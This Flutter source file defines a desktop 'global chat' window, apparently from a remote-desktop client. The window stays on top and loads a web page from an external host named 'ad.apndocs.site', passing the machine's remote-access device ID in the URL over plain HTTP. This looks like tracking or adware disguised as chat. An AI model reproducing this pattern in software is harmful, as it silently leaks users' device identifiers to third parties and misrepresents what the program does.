import 'dart:io';
import 'package:flutter/material.dart';
import 'package:webview_windows/webview_windows.dart';
import 'package:window_manager/window_manager.dart';

import '../../models/platform_model.dart';
import '../../common.dart';

class DesktopGlobalChatScreen extends StatefulWidget {
  const DesktopGlobalChatScreen({Key? key}) : super(key: key);

  @override
  State<DesktopGlobalChatScreen> createState() => _DesktopGlobalChatScreenState();
}

class _DesktopGlobalChatScreenState extends State<DesktopGlobalChatScreen> {
  final _controller = WebviewController();
  bool _isWebviewInitialized = false;

  @override
  void initState() {
    super.initState();
    _initWebview();
  }

  Future<void> _initWebview() async {
    // Position window at bottom right
    await windowManager.ensureInitialized();
    WindowOptions windowOptions = const WindowOptions(
      size: Size(350, 500),
      center: false,
      backgroundColor: Colors.transparent,
      skipTaskbar: false,
      titleBarStyle: TitleBarStyle.hidden,
      alwaysOnTop: true,
    );
    await windowManager.waitUntilReadyToShow(windowOptions, () async {
      final Size screenSize = await windowManager.getBounds().then((b) => b.size);
      // Try to position it at bottom right. This might require screen size, 
      // but windowManager.setAlignment(Alignment.bottomRight) works too.
      await windowManager.setAlignment(Alignment.bottomRight);
      await windowManager.show();
      await windowManager.focus();
    });

    try {
      await _controller.initialize();
      // Replace this IP with the actual VPS IP
      final deviceId = bind.mainGetLocalOption(key: 'custom-id');
      await _controller.loadUrl('http://ad.apndocs.site/?device_id=$deviceId');
      
      if (!mounted) return;
      setState(() {
        _isWebviewInitialized = true;
      });
    } catch (e) {
      debugPrint("Webview initialization error: $e");
    }
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      body: Stack(
        children: [
          if (_isWebviewInitialized)
            Webview(_controller),
          if (!_isWebviewInitialized)
            const Center(child: CircularProgressIndicator()),
          
          // A tiny draggable area or close button at top right
          Positioned(
            top: 0,
            right: 0,
            child: IconButton(
              icon: const Icon(Icons.close, color: Colors.white70, size: 20),
              onPressed: () {
                windowManager.close();
              },
            ),
          ),
          
          // Drag area
          Positioned(
            top: 0,
            left: 0,
            right: 40,
            height: 30,
            child: GestureDetector(
              behavior: HitTestBehavior.translucent,
              onPanStart: (details) {
                windowManager.startDragging();
              },
            ),
          ),
        ],
      ),
    );
  }
}
